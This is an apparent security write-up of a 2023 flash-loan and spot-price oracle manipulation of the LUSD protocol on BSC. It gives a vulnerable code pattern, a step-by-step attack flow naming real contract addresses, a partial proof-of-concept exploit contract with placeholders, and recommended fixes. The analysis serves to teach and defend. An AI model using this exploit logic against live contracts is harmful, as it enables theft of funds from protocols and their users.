# LUSD Flash Loan Oracle Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | LUSD |
| Date | 2023-07-10 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$16,000 USD |
| Attack Type | Flash Loan + Oracle Manipulation |
| CWE | CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) |
| Attacker Address | Undisclosed |
| Attack Contract | `0x21ad028c185ac004474c21ec5666189885f9e518` |
| Vulnerable Contract | `0x637de69f45f3b66d5389f305088a38109aa0cf7c` (LUSD_POOL) |
| Fork Block | 29,756,866 |

## 2. Vulnerability Code Analysis

The LUSD protocol's LOAN contract calculated the LUSD minting amount based on the BTCB-BSC-USD pool ratio. By manipulating the pool ratio via a flash loan, an attacker could mint an excessive amount of LUSD.

```solidity
// Vulnerable pattern: real-time pool ratio-based oracle
contract LOAN {
    LUSDPOOL public lusdPool;
    IPancakePair public btcbUsdPair;

    function mintLUSD(uint256 btcbAmount) external {
        // Vulnerable: uses manipulable spot price
        (uint112 reserve0, uint112 reserve1,) = btcbUsdPair.getReserves();
        uint256 btcbPrice = uint256(reserve1) * 1e18 / uint256(reserve0);  // manipulable

        // Mints excessive LUSD using inflated BTCB price
        uint256 lusdAmount = btcbAmount * btcbPrice / 1e18;
        lusdPool.mint(msg.sender, lusdAmount);
    }
}
```

**Vulnerability**: The BTCB price was calculated using the DEX spot price, allowing an attacker to inflate the price via a flash loan and mint an excessive amount of LUSD.

### On-chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + Oracle Manipulation
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker
  │
  ├─1─▶ DPPOracle1.flashLoan() [0x26d0c625e5F5D6de034495fbDe1F6e9377185618]
  ├─2─▶ DPPOracle2.flashLoan() [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]
  ├─3─▶ DPPOracle3.flashLoan() [0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A]
  ├─4─▶ DPP.flashLoan() [0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476]
  ├─5─▶ DPPAdvanced.flashLoan() [0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d]
  │      → Acquire large amount of BUSDT
  │
  ├─6─▶ pancakeCall() → Buy large amount of BTCB with BUSDT
  │      [PancakeRouter: 0x10ED43C718714eb63d5aA57B78B54704E256024E]
  │      Manipulate BTCB-BUSDT pair price
  │      [CakeLP: 0x3F803EC2b816Ea7F06EC76aA2B6f2532F9892d62]
  │
  ├─7─▶ takeFlashloan() → Call LOAN.mintLUSD()
  │      [LOAN: 0xdec12a1dcbc1f741ccd02dfd862ab226f6383003]
  │      Mint excessive LUSD using inflated BTCB price
  │
  ├─8─▶ Convert LUSD → BUSDT
  │
  └─9─▶ Repay all flash loans + realize profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface LOAN {
    function mintLUSD(uint256 btcbAmount) external;
}

interface LUSDPOOL {
    function swap(address tokenIn, uint256 amountIn) external;
}

contract LUSDExploit {
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IERC20 LUSD = IERC20(0x/* LUSD token */);
    LOAN loan = LOAN(0xdec12a1dcbc1f741ccd02dfd862ab226f6383003);
    LUSDPOOL lusdPool = LUSDPOOL(0x637de69f45f3b66d5389f305088a38109aa0cf7c);
    IDPPOracle DPPOracle1 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);

    function testExploit() external {
        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)) * 99/100, address(this), "chain");
    }

    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata data) external {
        if (/* last in chain */) {
            // Swap to manipulate BTCB price
            _swapUSDTtoBTCB(BUSDT.balanceOf(address(this)) / 2);

            // Mint LUSD at inflated price
            loan.mintLUSD(BTCB.balanceOf(address(this)));

            // Convert LUSD → BUSDT
            lusdPool.swap(address(LUSD), LUSD.balanceOf(address(this)));

            // Reverse swap BTCB → BUSDT
            _swapBTCBtoUSDT(BTCB.balanceOf(address(this)));
        }
        // Repay upstream flash loan
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) |
| Vulnerability Type | DEX spot price oracle manipulation |
| Impact Scope | LUSD token issuance amount |
| Explorer | [BSCscan](https://bscscan.com/address/0x637de69f45f3b66d5389f305088a38109aa0cf7c) |

## 6. Security Recommendations

```solidity
// Fix 1: Use Chainlink BTCB/USD oracle
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

AggregatorV3Interface public btcbPriceFeed =
    AggregatorV3Interface(0x264990fbd0A4796A3E3d8E37C4d5F87a3aCa5Ebf); // BSC BTCB/USD

function getBTCBPrice() public view returns (uint256) {
    (uint80 roundId, int256 price, , uint256 updatedAt, uint80 answeredInRound) =
        btcbPriceFeed.latestRoundData();
    require(answeredInRound >= roundId, "Stale price");
    require(updatedAt >= block.timestamp - 3600, "Price too old");
    require(price > 0, "Invalid price");
    return uint256(price) * 1e10; // 8 decimals → 18 decimals
}

// Fix 2: Use TWAP of 30 minutes or more
// Use a minimum 30-minute TWAP instead of a simple spot price
```

## 7. Lessons Learned

1. **PancakeSwap Spot Price Oracle Risk**: Protocols on BSC that use PancakeSwap spot prices as an oracle are vulnerable to chained DPP Oracle flash loan attacks.
2. **BTCB Price-Dependent Protocols**: Lending/minting protocols that calculate the price of assets like BTCB using DEX-based methods must use a Chainlink oracle instead.
3. **Small Losses Also Reveal Patterns**: Although the loss was a modest $16,000, the same attack pattern has led to millions of dollars in losses at other protocols.
4. **Chained Multi-DPP Oracle Pattern**: The attack pattern of sequentially using 5 DPP Oracles is very common on BSC. This pattern should be detected via on-chain monitoring.